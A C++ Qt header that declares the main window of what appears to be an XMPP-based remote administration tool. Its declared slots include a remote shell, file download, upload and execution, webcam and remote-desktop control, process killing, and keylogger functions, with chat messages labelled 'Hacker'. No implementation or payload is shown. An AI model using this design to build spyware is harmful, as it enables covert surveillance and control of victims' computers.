/*
 *  Copyright (C) 2011 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QMessageBox>
#include <QInputDialog>
#include <QDataStream>
#include <ventanaarchivos.h>
#include <ventanaescritorio.h>
#include <ventanaopciones.h>
#include <ventanawebcam.h>
#include <ventanaopcionesxmpp.h>
#include <QDir>
#include <QFile>
#include <QGridLayout>
#include <QThread>
#include <QTime>
#include <QList>
#include <QTreeWidgetItem>
#include <QTranslator>
#include <qxmpp/QXmppClient.h>
#include "qxmpp/QXmppTransferManager.h"

namespace Ui
  {
  class MainWindow;
}

class MainWindow : public QMainWindow
  {
    Q_OBJECT
  public:
    MainWindow ( QWidget *parent = 0 );
    ~MainWindow();
    bool logado;
    QTranslator traductor;
    QGridLayout *layoutPrincipal;
    QString alias;
    QString copiaRuta;
    QString copiaNombre;
    QThread hilo;
    ventanaArchivos ventana;
    ventanaEscritorio escritorio;
    ventanawebcam webcam;
    ventanaOpciones opciones;
    ventanaopcionesxmpp opcionesXmpp;
    QXmppClient cliente;
    QList<QTreeWidgetItem *> listaItems;
    QString servidor;
    QFile *archivoRecibido;
    QXmppTransferManager *manager;
    QXmppTransferJob *job;
    QByteArray datos,datosMini,datosWebcam;
    QBuffer buffer,bufferMini,bufferWebcam;
    unsigned long int numCapturas;
    QMessageBox mensajeEmergente;
  public slots:
    //slost de conexion
    void conectar();
    void confirmarConectado();
    void rosterRecibido();
    void cambioRoster(QString barejid, QString resource);
    void elegirServidor();
    void anadirServidor();
    void borrarServidor();
    void cerrarServidor();
    void desconectar();
    void llegadaDatos(const QXmppMessage &mensaje);
    void reinciar();
    void desinfectar();
    void apagarEquipo();
    void reiniciarEquipo();
    void actualizarProcesos();
    void matarProceso();
    //slots manejo de frames
    void listaOpciones();
    void esconderFrames();
    //slots de shell remota
    void shellEnviar();
    //slots menu ayuda
    void showAboutQt();
    void licencia();
    void about();
    //slot menu opciones
    void opcionesServidor();
    // slots de administrador de archivos
    void cambioComboUnidad();
    void abrirVentanaArchivos();
    void abrirVentanaWebcam();
    void abrirVentanaOpcionesXmpp();
    void ponerUnidades(QStringList unidades);
    void ponerArchivos ( QStringList archivos );
    void ponerDirectorios ( QStringList directorios );
    void directorioCambio();
    QString obtenerRutaAnterior(QString rutaActual);
    void archivosIr();
    void archivosAtras();
    void archivosHome();
    void archivosRefresco();
    void archivosDescargar();
    void archivosSubir();
    void archivosBorrar();
    void archivosCarpeta();
    void archivosEjecutar();
    void archivosCopiar();
    void archivosMover();
    void archivosRenombrar();
    void archivosPrevia();
    void archivosBorrarCarpeta();
    void archivosTamano();
    void recibirArchivo(QXmppTransferJob* transferencia);
    void transferenciaCompleta(QXmppTransferJob* transferencia);
    void progreso(qint64 hecho,qint64 total);
    //slots de mensajes
    void enviarMensaje();
    //slots del escritorio remoto
    void abrirVentanaEscritorio();
    void clicado(QString cadena);
    void enviarTecla(QString cadena);
    //slots del chat
    void abrirChat();
    void cerrarChat();
    void enviarMensajeChat();
    void ponerMensajeChat(QString mensajeChat,QString quien = "Hacker");
    void activarKey();
    void desactivarKey();
    void recibirKey();
    void limpiarKey();
    void pedirInformacion();
    void traducir(QAction *idioma);
  signals:
    void procesar(QByteArray);

  protected:
    void changeEvent ( QEvent *e );
    virtual bool event(QEvent *event);

  private:
    Ui::MainWindow *ui;
  };

#endif // MAINWINDOW_H
